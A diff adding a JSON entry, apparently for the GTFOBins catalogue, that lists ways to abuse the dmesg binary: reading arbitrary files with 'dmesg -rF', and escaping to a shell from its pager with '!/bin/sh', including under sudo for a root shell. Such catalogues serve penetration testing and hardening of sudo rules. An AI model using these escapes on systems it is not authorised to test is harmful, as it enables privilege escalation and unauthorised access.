@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "file-read": [
+      {
+        "description": "This is not suitable for binary files.",
+        "code": "LFILE=file_to_read\ndmesg -rF \"$LFILE\"\n"
+      }
+    ],
+    "shell": [
+      {
+        "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
+        "code": "dmesg -H\n!/bin/sh\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
+        "code": "sudo dmesg -H\n!/bin/sh\n"
+      }
+    ]
+  }
+}
